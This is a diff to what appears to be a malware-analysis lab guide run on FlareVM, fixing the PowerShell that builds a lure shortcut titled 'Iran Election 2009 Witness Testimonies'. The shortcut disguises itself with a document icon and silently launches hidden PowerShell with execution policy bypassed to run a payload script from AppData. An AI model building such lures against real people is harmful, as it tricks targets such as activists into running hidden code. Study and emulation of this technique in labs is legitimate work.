@@ -120,11 +120,12 @@ On FlareVM, open PowerShell as Administrator:
 ```powershell
 $shell = New-Object -ComObject WScript.Shell
 
+$fullPayloadPath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\payload.ps1"
 $lnkPath = "$env:USERPROFILE\Desktop\Iran-Election-2009-Witness-Testimonies.lnk"
 $lnk = $shell.CreateShortcut($lnkPath)
 
 $lnk.TargetPath = "powershell.exe"
-$lnk.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:APPDATA\Microsoft\Windows\payload.ps1"'
+$lnk.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$fullPayloadPath`""
 $lnk.IconLocation = "C:\Windows\System32\shell32.dll,1"
 $lnk.Description = "Iran Election 2009 Witness Testimonies"
 $lnk.Save()
